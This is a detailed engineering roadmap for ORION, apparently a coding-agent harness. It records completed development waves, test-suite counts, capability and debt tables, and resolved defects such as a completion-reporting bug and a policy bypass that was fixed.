# ORION — Master Harness Development Plan

**The single authoritative roadmap for ORION. There is no other plan document.**

**Status: PLAN ONLY. No implementation is performed by this document. `v0/src` unmodified by it.**

**Edition: 2026-09-18 — post-W10 re-chart.** Supersedes the 2026-09-07 edition in place.

What changed in this edition:

- **Waves 0–10 are now COMPLETED DEVELOPMENT HISTORY** (Part A). They are preserved as a record,
  not re-planned as work. The previous edition's forward roadmap began at W5; that is stale.
- **A current-state baseline replaces inference** (Part B), re-derived from the tree, not from
  earlier reports.
- **Post-W10 development is re-charted** (Part E) from the 14 audit reports, the current source,
  and dependency analysis. Every old W11–W14 capability survives and is explicitly mapped in the
  preservation matrix (Part J).
- **A permanent benchmark ladder replaces subjective maturity scores** (Part D). The former
  "10/10" section and its 1–10 dimension table are removed and replaced by hard gates and measured
  values.
- **A feature-entry gate** (Part C §C.6) now governs what may become committed work at all.
- **This amendment adds model onboarding** (2026-09-18): model-aware provider profiles in P1,
  one-command model selection in P5, and benchmarks **O1–O2** (§D.7) — declarative and
  trajectory-neutral.
- **This amendment adds the developer-workflow layer** (2026-09-18). Into phases: **undo/restore
  and explicit operating modes in P5**; **persistent background shell processes in P8**;
  **eval-as-product (`orionctl eval`) as P5 public surface, gated post-E5**. Held at the §C.6 gate
  as candidates (so they are recorded, not forgotten, and not scheduled): git write-side contract,
  worktrees, review/PR lifecycle, repository map, custom tools/commands, IDE integration —
  each with an investigation trigger (§I.2.9–I.2.14).

**Evidence tags used throughout:** **FACT** (observed in source or a command's output) ·
**MEASURED** (reproduced with numbers) · **INFERENCE** (reasoned from evidence) ·
**RECOMMENDATION** (proposed, not decided) · **UNKNOWN — NOT YET MEASURED** (with the experiment
that would resolve it named).

Nothing is carried forward from an earlier document without re-verification against the tree. Where
current source and an older report conflict, **current source wins for present implementation
state**, and the discrepancy is recorded rather than silently overwritten.

---

## How to read this document

| Part | Contains | Changes when |
|---|---|---|
| **A** | Historical record, W0–W10 | never — append-only |
| **B** | Current baseline at the W10 boundary | each release |
| **C** | North star, invariants, entry gate | rarely; requires explicit decision |
| **D** | Benchmark program (Levels A–E, E5/E6) | when a benchmark is added or a result lands |
| **E** | Post-W10 roadmap (phases P0–P12) | as evidence arrives |
| **F** | Security / autonomy architecture | with each security-touching phase |
| **G** | Testing and release policy | rarely |
| **H** | Technology and dependency policy | rarely |
| **I** | Research / candidate / conditional / rejected | continuously |
| **J** | Preservation and traceability matrix | whenever E changes |
| **K** | Evidence index | continuously |

---


## 0. Executive summary

**The asymmetry has moved.** The previous edition described a strong substrate with a thin
commodity layer. That is no longer the shape of the problem. W6–W10 closed the commodity gap:
search, git, config, skills, project instructions, MCP, subagents, parallel execution and a real
container boundary all shipped.

**The shape today (FACT, verified against the tree 2026-09-18).** ORION is a mature execution
substrate with a competitive capability layer and **no product surface for the thing that makes it
different**. Replay, fork, effect-aware recovery, provenance and truthful completion are all
implemented, and a developer encounters them only as CLI verbs.

**The two gaps that matter, both MEASURED:**

1. **No automated test exercises a live model.** `tests/run-all.mjs` enumerates 50 suites;
   `tests/real-model/` is not among them. The six shipped-path suites spawn the real binary against
   `http://127.0.0.1:9/v1` — a deliberately dead endpoint. Every provider-shaped defect in this
   project's history (Gemma tool-call array, Qwen empty completion, Gemini `thought_signature`,
   Groq reasoning-only) escaped the suite and was found by a manual gate.
2. **Capability at frontier model grade is unmeasured.** E4 measured 10-file dependency-free
   subtrees at ~4.4 model calls per run, with no project instructions, no skills, no multi-file
   work, no subagents and **zero compaction events in 54 runs**. Its 45/54 is evidence the *rig*
   does not lie. It is not a capability number and must never be quoted as one.

**The strategic reading.** Three analyses have examined the architecture: the 2026-09-11
`ORION-DEEP-COMPARATIVE-ARCHITECTURE-AUDIT` (genuinely independent — it predates both 2026-09-18
streams), the Claude seven-report set, and the opencode seven-report set. **The latter two share
provenance and are not demonstrably independent of each other — see §K.0.** So the agreement
between them is one opinion held twice, not corroboration, and the conclusion below rests on the
source evidence rather than on the count of analyses.

**That evidence: W6–W10 added container isolation, resource identity, grants, skills, MCP and child
trajectories without introducing a single competing source of truth** — every one of them landed as
events plus a fold (`projection/resource.mjs`, `grant.mjs`, `plan.mjs`, `lineage.mjs`), and the
contract grew v1→v6 additively with old logs still replaying. That is the strongest available
demonstration that the model scales to the remaining work.

The risk is no longer that the commodity layer arrives too late — it has arrived. The risk is that
the differentiator is never experienced, and that capability is asserted rather than measured.

**Therefore the sequence is:** establish provider truth so a live model is exercised by CI rather
than by hand (P1) → pay the isolation debt W10 incurred (P2) → add the two provenance fields that
become unrecoverable (P3) → **measure** (E5, then E6) → then let the evidence choose between agent
capability, developer surface, context/memory and autonomy, each of which is fully specified in
Part E and conditionally placed.

**Changes from the previous edition.** W0–W10 become history (Part A). Subjective maturity scores
are removed in favour of hard gates and measured values (Part D). A feature-entry gate now governs
admission to the roadmap (§C.6). Background execution moves from operations into execution/autonomy
semantics. Two new benchmarks are defined: **E5** (frontier developer measurement) and **E6**
(controlled harness attribution).

---

# PART A — HISTORICAL RECORD (W0–W10)

**This part is append-only.** It is not re-planned, re-interpreted, or optimised. ORION's thesis is
that a record of what happened cannot be rewritten; a roadmap that erased its own history would
violate the principle it exists to serve.

## A.1 Completed waves

| Wave | Delivered | Commit | Suite after | Contract |
|---|---|---|---|---|
| W0 | Public artifact validation (executed 2026-09-04) | — | — | — |
| W1 | Truthful completion (ADR-013) | `00b68a6` | 654 | v1/31 |
| W2 | Planning + verification loop; plan as a fold | `9de5324` | 746 / 27 | v2/35 |
| W3 | Context maturity + artifacts | `0baf4b4` | 797 / 28 | v3/36 |
| W4a | Provider abstraction + request provenance | `1be187a` | — | v4/39 |
| W4b | Streaming as durable partial execution | `c8b106f` | 904 / 30 | v4/39 |
| W4.5 | Ship safety + wiring integrity | `ee41579` | 950 / 31 | v4/39 |
| W5 | Foundation hardening | — | 1024 / 31 | v4/39 |
| W6 | Execution environment + resource identity + Recovery 2.0 + **Grant Store (W6-M)** | `681be8b` | 1286 / 35 | v5/46 |
| W6.1 | Live proofs (limits bind, network fail-closed) | `bc9e2f6`, `c8c91ee` | 1351 / 37 | v5/46 |
| W7 | Skills + project context | `afde869`, `82a5f5d` | 1499 / 39 | v6/49 |
| W8 | Search (glob, regex grep) + git + configuration | — | 1769 / 43 | v6/49 |
| W9 | MCP + external resources | `682b345` | 2017 / 46 | v6/49 |
| W10 | Subagents as child trajectories + parallel execution | `93703bd`, `b2a84ce` | 2253→2305 / 49–50 | v6/49 |
| P0 | Baseline integrity (store busy_timeout order + BEGIN retry, lazy `node:sqlite` + SQLite warning filter, bounded `requestTimeoutMs`, qwen reasoning shim, sha1 shadow naming — HIGH cross-project checkpoint exposure fixed — legacy-shadow notice). Report: `p0-baseline-integrity-report.md` | pending | 2379 / 52 (Node 22.17.0; first run here 2139/1/50) | v6/49 |

**FACT.** The contract grew v1→v6 and 31→49 types, **additive only**. A log written under any
earlier version still replays. `child.spawned` / `child.finished` were reserved in the frozen
vocabulary during the Wave-1 audit and finally emitted by W10 — the reservation discipline was
vindicated twice.

## A.2 The structural lesson — permanent policy, retained verbatim in force

Across W1–W6.1, six defects were **mechanisms that worked and were unreachable from the shipped
configuration**: the W1 Gemma shim array, W3 compaction never firing, W4 streaming unreachable from
the CLI, W4.5's `verify` bypassing `denyCommandPatterns`, W6's `policy.check()` with no caller in
`src/`, and W6.1's `pruneOrionContainers` imported but never called.

This produced **Invariant 10** (§C.4) and the per-wave `tests/shipped/` suites. From W7 onward no
new instance has appeared. **The guard is working, with one caveat recorded in §B.4.**

## A.3 Lessons that govern future work

1. **Distrust the instrument before the subject.** Three of four major findings in this project's
   history were rig defects wearing capability costumes: the Gemma baseline invalidated by venvs
   missing from `PATH`; E3's first result caused by an 8-byte shadow-git path collision; E4's first
   pilot caused by a hardcoded 60 s request timeout. In each case the scores were internally
   consistent and only the trajectories disagreed.
2. **A surprising agent outcome is never grounds to interrupt a run; only a demonstrable
   measurement defect is.**
3. **Report the gate result, not the satisfying one.** `CORPUS_NEEDS_MORE_TASKS` and
   `OUTCOME C — UNRESOLVED` were both accepted as legitimate outcomes.
4. **n=1 mechanism labels are one sample from a distribution.** The repeatability study found 5 of
   8 tasks changing *mechanism* between byte-identical repeats.
5. **A test that cannot fail is not evidence.** W10's first concurrency proof passed with batching
   disabled; it was replaced with peak-simultaneous-occupancy, which fails loudly.
6. **Separate "not proven" from "disproven."** The editing investigation was parked without
   recording the unsupported claim that small models cannot reach-and-edit.

---

## A.4 Status as recorded at the W5 boundary — HISTORICAL

> **SUPERSEDED by Part B** for current state. Retained because it records what was true when the
> W5 edition was written, and the wave-by-wave evidence below is part of the historical record.


### 2.1 Wave 0 — public artifact validation (EXECUTED 2026-09-04)

Real terminal, real models, no mocks. Found the substrate intact and three defects that made the
shipped CLI unable to complete an ordinary coding task.

The single most important historical finding, preserved because it is why Invariant 5 exists:

> **`orionctl run` reported `✓ model_finished` on a task it did not perform.**
> The file was unchanged, the failing test still failed, and the run recorded `completed`.

Durability primitives verified working from the published binary: replay (`model_calls_made: 0`,
0.55 s), fork (lineage `⑂#run@seq`), reap (orphan recovered), resume, status/JSON, explain.

**Verdict, preserved:** the substrate is real and works. The agent on top of it was not yet
trustworthy.

### 2.2 Completed waves

| Wave | Delivered | Evidence | State |
|---|---|---|---|
| **1 — Truthful completion** | D2 completion contract wired to run/resume/REPL; D3 shim auto-select (`ORION_SHIMS`); D1 lease heartbeat during model calls; `verify` tool; `isKnownDangerous`; `turn.finished` emitted; reserved types documented; CLI import-guard | `wave1-report.md`; 692/26 | **SHIPPED & VERIFIED** |
| **2 — Planning + verification** | `plan.*` ×4 (contract v2, 35 types); plan as a fold over the log surviving SIGKILL; `plan`/`plan_step` tools with `emits()` seam; `verify` taught in the system prompt; Windows CI shell path | `wave2-report.md`; 746/27 | **SHIPPED & VERIFIED** |
| **3 — Context + artifacts** | `artifact.created` (v3, 36 types); content-addressed ids; compaction ON by default and budget-aware; `elided_tool_call_ids` provenance; verify verdicts survive compaction; CI 4/4 green | `wave3-report.md`; 797/28 | **SHIPPED & VERIFIED** |
| **4a — Providers + provenance** | `createProvider({kind})`; `anthropic` as a falsification test of the seam; `request_digest`, `endpoint_host`, `params`, `context_bytes`; `redactSecrets` at write time | `wave4-report.md`; commit `1be187a` | **SHIPPED**, one gap (§2.4) |
| **4b — Streaming** | `stream.*` ×3 (v4, 39 types); bounded delta cadence (1 kB / 400 ms); partial durability on abort; `ttft_ms` populated | `wave4-report.md`; commit `c8b106f`; 904/30 | **SHIPPED & VERIFIED** |
| **4.5 — Ship safety** | F1 `verify` policy bypass closed (security); F4 completion false negative fixed; F5 provider + streaming wired to CLI (`ORION_PROVIDER`, `ORION_STREAM`); capability sets corrected; `tests/shipped/` (44 assertions); version 0.2.0 staged | `wave4_5-ship-safety-report.md`; 950/31; commit `ee41579` | **COMPLETE, UNPUBLISHED** |

### 2.3 The structural lesson from Waves 1–4.5 — permanent policy

**FACT (`wave4_5-ship-safety-report.md` F3).** Six defects across four waves were the same class:

| wave | defect | passed its own tests? |
|---|---|---|
| 1 | D2 — completion contract existed; CLI passed none | yes |
| 1 | D3 — shim existed; CLI wired none | yes |
| 2 | shim could not express an array argument | yes |
| 3 | compaction never fired on a real run | yes |
| 4 | F1 — `verify` bypassed deployer policy | yes |
| 4 | F5 — the provider seam was unreachable | yes |

Every one was found by manual testing or audit, never by the suite, because the suite tested
**modules** and the defect was in the **composition**.

> **Operating rule, permanent: if a mechanism is not reachable from `tests/shipped/`, it is not
> shipped — whatever its own suite says.**

### 2.4 Known follow-up from completed waves

| Item | Origin | Home |
|---|---|---|
| No live Anthropic API call ever made (stub only) | wave4-report §Manual | **W5** acceptance |
| Streaming exercised only on openai-compat | wave4-report | **W9** (second streaming impl) |
| Step evidence is model-declared, not runtime-derived | wave3-report §6; `future-queue.md` Q1 | **Research queue** (§12) |
| Compaction does not trigger on ordinary runs (6,354 B vs 24,000 B budget) | wave3-report, MEASURED | Not a defect; recorded |
| Per-model planning behaviour spread | `future-queue.md` Q2 | `eval/`, Track A |
| Reserved types `child.*`, `context.retrieved` unemitted | wave1-report §6 | **W10**, **W11** |
| `current-product-surface.md` is stale (pre-Wave-1) | this rebaseline | **W5** doc task |

---

## A.5 Table-stakes and differentiator analysis as of the W5 edition — HISTORICAL

> **SUPERSEDED by §C.3**, which re-derives these categories against eight comparator systems and
> withdraws the durable-fencing claim. Retained for the reasoning it records.


The strategic rule:

> **Reach strong modern coding-agent parity without becoming a feature-count clone.**

### 3.1 Differentiators — protect, extend, never trade away

Verified working and, per six-repository research, unmatched in the corpus:

1. **Effect-aware recovery** — 6 classes, pre-state witness on `write` (ADR-011), `SELF_VERIFYING`
   `edit`, `UNSAFE` shell that escalates rather than duplicating.
2. **Deterministic replay at zero model cost** — structural, not a feature.
3. **Truthful completion** — no corpus subject solves this.
4. **Fork with lineage** — durable `parent_run_id` / `forked_from_seq`.
5. **Execution fencing** — lease token on every write; CAS reclaim.
6. **Durable pause** — escalation releases the lease; a waiting run occupies no worker.
7. **Honest degradation** — every fallback emits `degraded`.
8. **Execution + context provenance** — request digest, artifact `source_seq`, compaction ids.
9. **Closed event contract** — replay stability depends on it.

**Moat honesty (INFERENCE).** Items 1–3 are the real moat: hard to copy, architecturally
load-bearing. Items 4–7 are strong but copyable in a quarter. Item 8 is elegant and commercially
weak on its own. Nothing here wins if a developer cannot search their repository.

### 3.2 Table stakes — copy without ego, including the interfaces

Developers will not adopt a harness lacking these, and there is no differentiation available in
any of them. Copy the *conventions* too (`SKILL.md`, `.claude/skills`, `AGENTS.md`) — interop is
free adoption.

Glob · regex search · project instructions · configuration file · skills · MCP · subagents ·
OS sandbox · permission configuration · session/turn UX · SDK · model switching · streaming ·
Git awareness.

### 3.3 Positioning

> **A complete modern coding-agent harness whose execution history is durable, attributable,
> recoverable, replayable and forkable.**

**Credible on the second half; not yet earned on the first.** The plan below is the ordering that
earns the first half without trading away the second.

---

## A.6 Product-surface audit at the W5 boundary — HISTORICAL

> **SUPERSEDED by §B.5.** Retained as the inventory that produced Invariant 10.


**Standard: can a real developer invoke it through the supported public interface?** A module
export is not a product. This section exists because F5 proved the question is not rhetorical.

| Surface | State | Gap → home |
|---|---|---|
| CLI commands (13) | **DONE** — run, chat, list, status, resume, answer, replay, fork, rerun, explain, doctor, reap, help | — |
| Provider selection | **DONE** — `ORION_PROVIDER` (4.5/F5) | — |
| Model / endpoint / API key | **DONE** — `ORION_MODEL`, `ORION_BASE_URL`, `ORION_API_KEY` | — |
| Streaming selection | **DONE** — `ORION_STREAM`, default ON | — |
| Posture selection | **DONE** — `ORION_POSTURE` | Derived from capability → **W6** |
| Shim selection | **DONE** — `ORION_SHIMS` incl. auto-detect | — |
| Interactive mode | **DONE** — REPL, each turn a durable run | — |
| Non-interactive mode | **DONE** — `orionctl run` | — |
| `--json` output | **PARTIAL** — `list`, `status`, `replay` only | **W12** |
| **Configuration file** | **MISSING** — env vars only | **W8** |
| **Project instructions** | **MISSING** — no `AGENTS.md`/`CLAUDE.md` equivalent | **W7** |
| **Permission rule file** | **MISSING** — authorizer is code-configured only | **W8** |
| Public SDK | **PARTIAL** — 66 exports, no convenience factory, no types | **W12** |
| **`.d.ts` types** | **MISSING** | **W5** (checkJs) → **W12** (published types) |
| **API / server mode** | **MISSING** | **W12** |
| Help output | **DONE** | — |
| Error messages | **DONE** — notably good (shell-missing hint, edit diagnostics) | — |
| `doctor` / diagnostics | **DONE** | Extend → **W13** |
| Install flow | **DONE** — zero-dep global install, CI-validated | — |
| **First-run flow** | **PARTIAL** — no guided setup; a missing key exits 2 with instructions | **W8** |
| **Live execution output** | **PARTIAL** — streaming durable; terminal rendering minimal | **W6** |

**Standing rule added to §11 testing policy:** every wave that adds a capability must add a
`tests/shipped/` assertion proving it is reachable from the composition root, and must state in its
report which product surface exposes it.

---

# PART B — CURRENT BASELINE AT THE W10 BOUNDARY

All values below were read from the tree or produced by a command run against it on **2026-09-18**.

## B.1 Baseline integrity — the canonical identifiers

| Field | Value |
|---|---|
| Repository path | `D:\Abhijith P\Desktop\harness` |
| Remote | `github.com/ALPHA0008/ORION.git` |
| Branch | `main` |
| HEAD | `c75ba6bf99455917654e3427924e03a758473448` (`c75ba6b`) |
| Package version | `@kernlbase/orion@0.2.1` (published) |
| Working tree | **DIRTY** — 3 modified files under `v0/src` |
| P0 refresh (2026-09-29, this machine) | Working tree dirty pre-commit; `v0/src` now also has `cli/warnings.mjs` (new) and changes in `cli/index.mjs`, `config/index.mjs`, `core/run/store.mjs`. Verified Level A: `npm test` **2379 passed / 0 failed / 52 suites**, Node 22.17.0, contract v6/49, lint 115 files. Prior-machine baseline 2305/0/50 (Node 24); first run here 2139/1/50. Commit SHA: pending. Live gate not run. See `p0-baseline-integrity-report.md`. |

**FACT — the earlier `E:\harness\harness` path does not exist on this machine.** Both current-state
audits independently recorded this. If a second copy of this repository is being edited elsewhere,
the trees will diverge and every value in this part is true only of the tree named above.
**RECOMMENDATION: confirm a single authoritative tree before the next implementation cycle.**

### B.1.1 Baseline-integrity condition for the next cycle

**HEAD is not the tree.** Three shipped-source fixes are uncommitted:

| File | Change | Verified |
|---|---|---|
| `config/index.mjs` | `requestTimeoutMs` schema key, env `ORION_REQUEST_TIMEOUT_MS` | `180000`→180 000 ms; `-5`, `abc`, unset → 60 s default |
| `cli/index.mjs` | wires the timeout into `createProvider` behind a positive-finite guard | env values bypass the schema `validate` hook, so the guard is load-bearing |
| `core/run/store.mjs` | `tx()` retries `BEGIN IMMEDIATE` on `SQLITE_BUSY` (5 × 250 ms) | scoped to BEGIN only; the transaction body never re-executes |
| `core/run/store.mjs` | **`busy_timeout` armed before `journal_mode=WAL`** | 2/8 → 0/8 simultaneous openers crash |

The PRAGMA ordering defect is the material one: `journal_mode=WAL` takes a brief exclusive lock and
`busy_timeout` was set four statements later, so that PRAGMA ran at SQLite's default timeout of 0.
**`c75ba6b` therefore loses 2 of 8 processes that open one store simultaneously.**

> **CONDITION B1 — clean baseline before measurement.** E5, E6 and any concurrency or delegation
> benchmark MUST run against a committed, identified SHA that contains these fixes. Running them
> from a clean checkout of `c75ba6b` would produce store-contention failures that would be
> misattributed to the agent. This is a benchmark-validity condition, not a development blocker:
> the plan may be written and phases designed now.

## B.2 Shape

| Measure | Value |
|---|---|
| Source modules | 44 `.mjs` |
| Source lines | 11,455 |
| **Required** production dependencies | **`{}` — none** |
| Optional dependencies | `@modelcontextprotocol/sdk@1.30.0`, exact-pinned, lazily imported; MCP degrades and the run continues without it |
| ADRs | 13 |
| Event contract | **v6, 49 frozen types**, additive-only |
| Test suites in manifest | **50** |
| Assertions | **2317 passed, 0 failed** |
| CLI verbs | **16** |
| Model-facing tools | see §B.3 |

Largest modules, which is where complexity actually lives:

```
1303  src/cli/index.mjs          ← composition root; Invariant 10 lives or dies here
1005  src/agent/loop/worker.mjs  ← the loop
 714  src/agent/tools/index.mjs
 650  src/sandbox/local/index.mjs
 613  src/core/run/store.mjs     ← the only mutation path
 366  src/sandbox/container/index.mjs
```

## B.3 Tool surface — counting convention resolved

Earlier reports differ on the tool count. This is a counting convention, not an architectural
disagreement. Resolved from the current registry (`src/agent/tools/index.mjs`, `src/core/child/tool.mjs`,
`src/cli/index.mjs`):

| Class | Tools | Count |
|---|---|---|
| **Core — always composed** | `read` `grep` `glob` `git` `write` `edit` `bash` `verify` `plan` `plan_step` `ask_user` | **11** |
| **Conditional** | `skill` (only when skills are discovered — `...(skills.length ? {…})`), `subagent` (composed at the CLI root via `makeSubagentTool`; removable with `denyTools: ["subagent"]`) | **2** |
| **Dynamic** | MCP tools, namespaced `mcp__<server>__<tool>`, one per declared server tool | variable |
| **Total model-facing, typical full configuration** | core + conditional | **13** + MCP |

## B.4 Test taxonomy — the distinction that changes how 2317 should be read

| Class | Count | In default `npm test` | Notes |
|---|---|---|---|
| Deterministic (no model) | majority of 2317 | yes | folds, store, recovery, projections |
| **Stubbed model** | remainder of 2317 | yes | `tests/_helpers/fake-provider.mjs` (local HTTP server), `script-model.mjs` (scripted turns) |
| **Shipped-path** | 6 suites: `shipped/shipped`, `w6`–`w10` | yes | spawns the real binary — but `ORION_BASE_URL ??= 'http://127.0.0.1:9/v1'`, a **deliberately dead endpoint** |
| **Live provider** | `tests/real-model/` (5 scripts) | **NO — not in the manifest** | out-of-band, run by hand |
| Live repository | `v0/eval/run-e4.mjs` | no | 54 runs, local qwen |
| Benchmark | E3, E4 | no | results gitignored |

**FACT: no automated assertion calls a real model.** This is simultaneously the suite's strength
(fast, hermetic, deterministic, CI-safe) and the system's largest verification gap. It is the reason
Phase P1 is first.

It also qualifies §A.2: the shipped-path suites prove a capability is *reachable* from the CLI. They
do not prove a model can traverse it.

## B.5 Capability inventory at the W10 boundary

Axes: Implemented · Wired · User-reachable · Tested · Real provider · Real repo · Under failure ·
Benchmarked. ● full · ◐ partial · ○ absent · n/a.

| Capability | Impl | Wired | Reach | Test | Prov | Repo | Fail | Bench |
|---|---|---|---|---|---|---|---|---|
| Durable event log | ● | ● | ● | ● | ● | ● | ● | ● |
| Bounded projection (ADR-001) | ● | ● | ● | ● | ● | ● | ● | ◐ |
| Deterministic replay, zero model cost | ● | ● | ● | ● | ● | ● | ● | ◐ |
| Fork from arbitrary seq | ● | ● | ● | ● | ◐ | ◐ | ● | ○ |
| Effect-aware recovery (ADR-002/003/011) | ● | ● | ● | ● | ● | ● | ● | ◐ |
| Execution fencing (ADR-008) | ● | ● | ● | ● | ● | ● | ● | ○ |
| Truthful completion (ADR-013) | ● | ● | ● | ● | ● | ● | ● | ○ |
| Provenance (model/context/artifact/decision) | ● | ● | ● | ● | ● | ● | ● | ○ |
| Resource identity + reattachment | ● | ● | ● | ● | ● | ◐ | ● | ○ |
| **Grant Store** | ● | ● | ● | ● | ◐ | ○ | ◐ | ○ |
| Container isolation | ● | ● | ● | ● | ● | ◐ | ● | ◐ |
| Network egress policy (fail-closed) | ● | ● | ● | ● | ● | ○ | ● | ○ |
| Provider abstraction (2 kinds + 2 shims) | ● | ● | ● | ● | ● | ● | ◐ | ○ |
| Streaming (durable partial execution) | ● | ● | ● | ● | ● | ● | ● | ○ |
| Plan projection | ● | ● | ● | ● | ● | ● | ● | ○ |
| Artifacts | ● | ● | ● | ● | ● | ● | ● | ○ |
| Compaction | ● | ● | ● | ● | ● | ◐ | ● | ○ |
| Skills (progressive disclosure + provenance) | ● | ● | ● | ● | ◐ | ◐ | ◐ | ○ |
| Project instructions (`AGENTS.md`/`CLAUDE.md`) | ● | ● | ● | ● | ● | ● | ◐ | ○ |
| Search: glob + regex grep | ● | ● | ● | ● | ● | ● | ◐ | ○ |
| Git (read-only) | ◐ | ● | ● | ● | ◐ | ● | ◐ | ○ |
| Config file + permission rules | ● | ● | ● | ● | ● | ● | ◐ | ○ |
| MCP client | ● | ● | ● | ● | ● | ◐ | ◐ | ○ |
| Subagents / child runs | ● | ● | ● | ● | ● | ◐ | ● | ○ |
| Parallel children | ◐ | ● | ● | ● | ◐ | ○ | ◐ | ○ |
| Memory / retrieval | ○ | ○ | ○ | n/a | n/a | n/a | n/a | n/a |
| `--json` on all verbs | ◐ 5/16 | ◐ | ◐ | ◐ | n/a | n/a | n/a | n/a |
| SDK / `.d.ts` / server mode | ○ | ○ | ○ | n/a | n/a | n/a | n/a | n/a |
| Trajectory UX / timeline | ○ | ○ | ○ | n/a | n/a | n/a | n/a | n/a |
| Ops: backup, retention, GC, metrics, tracing | ○ | ○ | ○ | n/a | n/a | n/a | n/a | n/a |
| Postgres / multi-tenancy / scale | ○ | ○ | ○ | n/a | n/a | n/a | n/a | n/a |
| Background / detached execution | ○ | ○ | ○ | n/a | n/a | n/a | n/a | n/a |
| LSP / code intelligence | ○ | ○ | ○ | n/a | n/a | n/a | n/a | n/a |
| Web / browser | ○ | ○ | ○ | n/a | n/a | n/a | n/a | n/a |
| Multimodal context | ○ | ○ | ○ | n/a | n/a | n/a | n/a | n/a |
| Hooks / plugins | ○ | ○ | ○ | n/a | n/a | n/a | n/a | n/a |

**Reserved but unemitted: exactly one** — `context.retrieved`. **Implemented but unwired: none
found** at this audit.

## B.6 Known debt at the W10 boundary

| # | Debt | Evidence | Disposition |
|---|---|---|---|
| D1 | **Child resource isolation absent.** Sibling children share one container and one `ORION_HOME`; parallel edits can collide. | W10 report | **P2** — this is the one place the dependency graph was violated in the built system |
| D2 | No per-child CPU/memory/PID caps | W10 report | P2 |
| D3 | **No provider retry / rotation / backoff.** A 429 killed the W10 gate five times; a Hive outage across 7 keys stopped a wave. | W10, wave-gates records | **P1** |
| D4 | No stream-idle watchdog | INFERENCE from the 60 s timeout being the only guard | P1 |
| D5 | **Compaction effectively never fires.** ~6 KB outbound against a 24 KB budget; 0 events in 54 E4 runs. | W3 report, E4 results | P6 — measure in E5 first |
| D6 | Tool dispatch sequential except a consecutive-delegate batch; no parent-continues-while-child | `worker.mjs` | P8 |
| D7 | `resource.released` absent on normally-completed runs (`appendStatus` clears the lease at terminal status — Invariant 4) | W9 report | P9; no leak — sessions genuinely close |
| D8 | **W3b live gate blocked** by a reproducible Hive 401-on-resume-after-exit-1, 5/5 across 3 keys | wave-gates record | P1 rider — provider-side |
| D9 | Linux-native / podman untested; Docker-on-WSL2 is the only measured runtime | W6.1 §11.4 | standing disclosure |
| D10 | Three shipped fixes uncommitted (§B.1.1) | `git diff` | **P0 — commit before P1** |

---

## B.7 Defect and gap register — resolved history and open work

This register was compiled before W5. **Most of it is now resolved history.** It is repaired rather
than deleted, because the record of what was found and where it went is part of the project's
evidence trail.

**How to read it.** Rows marked **RESOLVED in W5** (or a later wave) are closed and are kept only as
history — they are *not* open work and must not be re-planned. Rows marked with a **P-phase** are
genuinely open and are owned by that phase; the live view of open debt is **§B.6**, which supersedes
this table for current status.

Every row was re-checked against the current tree on 2026-09-18. Rows that became false over W6–W10
are marked as such with the evidence.

### B.7.1 Persistence

| # | Issue | Evidence then | Current status |
|---|---|---|---|
| P1 | No schema versioning or migration runner | `store.mjs:20-58` | **RESOLVED in W5** — `SCHEMA_VERSION`, `MIGRATIONS`, forward-only runner; a newer DB is refused loudly rather than guessed at |
| P2 | No old-DB upgrade test | — | **RESOLVED in W5** — cross-version replay is a per-wave invariant (Benchmark Level A) |
| P3 | No backup/restore procedure | — | **OPEN → P11** |
| P4 | Default durability benchmarked only to 10.3k events | `benchmarks/results-full.json` | **RESOLVED in W5** (E1) |

### B.7.2 Store boundary

| # | Issue | Evidence then | Current status |
|---|---|---|---|
| S1 | Raw SQL outside the store — 6 sites in reaper, 2 in replay, 1 PRAGMA in CLI | `lease/reaper.mjs`, `replay/index.mjs:57-62` | **RESOLVED in W5** — verified: `INSERT INTO events` outside `Store` now returns 0 hits |
| S2 | Direct `INSERT INTO events` bypasses `isKnownType()` | `reaper.mjs:25`, `replay/index.mjs:60` | **RESOLVED in W5** — the closed-vocabulary guard is no longer bypassable |
| S3 | Storage not swappable without touching 3 modules | as above | **RESOLVED in W5** — and this is precisely what makes **P12a** (Postgres behind the unchanged `Store` API) an option that costs nothing to hold |

### B.7.3 Reaper and lifecycle

| # | Issue | Evidence then | Current status |
|---|---|---|---|
| R1 | `expireHumanRequests` not atomic — 4 writes across 3 transactions | `reaper.mjs:43-48` | **RESOLVED in W5** |
| R2 | No terminal-state guard there | same | **RESOLVED in W5** |
| R3 | `force: true` bypasses fencing in 2 callers | `store.mjs:217`, `worker.mjs:614`, `reaper.mjs:46` | **RESOLVED in W5** — zero runtime `force: true` callers remain; the W5 audit also found it was bypassing *execution fencing*, not the terminalize-twice guard |
| R4 | `appendStatus()` not used by the reaper | `reaper.mjs:45-47` | **RESOLVED in W5** |

### B.7.4 Runtime

| # | Issue | Evidence then | Current status |
|---|---|---|---|
| X1 | `execFileSync` blocks the event loop — caps at 1 run/process | `sandbox/local/index.mjs:123` | **RESOLVED in W5** for the agent exec path (`local/index.mjs:405` records the change). `execFileSync` survives only on git-shadow operations and a clamp path, neither on the model/tool hot loop |
| X2 | No lease heartbeat on the tool path | `worker.mjs:414-544` | **RESOLVED in W5** — `#withLeaseHeartbeat` wraps the tool path; a tool call longer than the lease no longer loses it |
| X3 | Missing `await` on the human-approval resume path | `worker.mjs:600` | **RESOLVED in W5** — now `await this.#consumeHumanAnswers(...)` at `worker.mjs:214` |
| X4 | `tool.timed_out` declared, emitted nowhere | `event/index.mjs:33` vs `worker.mjs:503` | **RESOLVED in W5** — now emitted; the type was already in the frozen v4 set, so no contract change was needed |
| X5 | No cancellation semantics | — | **RESOLVED in W5** — `ExitReason.CANCELLED`, carried by `run.parked`; cancellation is not a failure |
| X6 | Single flat `execTimeoutMs`; no layered timeout budget | `sandbox/local/index.mjs:13` | **PARTIALLY OPEN.** W6 addressed sandbox layering; the *model request* timeout was hardcoded at 60 s until the pending fix in §B.1.1 made it configurable. Remaining layering work is unowned and small — **P11** if it proves to matter |
| X7 | Dead ternaries with byte-identical branches | `store.mjs:223-225`, `:243-245` | **RESOLVED in W5** |

### B.7.5 Evaluation boundary

| # | Issue | Evidence then | Current status |
|---|---|---|---|
| E1 | `eval/` is not in CI | `ci.yml:24` | **RESOLVED in W5** — and it paid for itself immediately: the new gate found 11 unawaited `sandbox.exec` call sites that had made every `test_command` verifier an unconditional pass |
| E2 | `eval/` deep-imports `core/projection` | `eval/metrics/index.mjs:6` | **RESOLVED in W5** |
| E3 | Eval config ≠ shipped defaults; reports unlabelled | `run-baseline.mjs:133` | **RESOLVED in W5** |

### B.7.6 Extensibility

| # | Issue | Evidence then | Current status |
|---|---|---|---|
| T1 | `MUTATING_TOOLS` duplicates the `effects` property by name | `cli/index.mjs:146` | **RESOLVED in W5** |
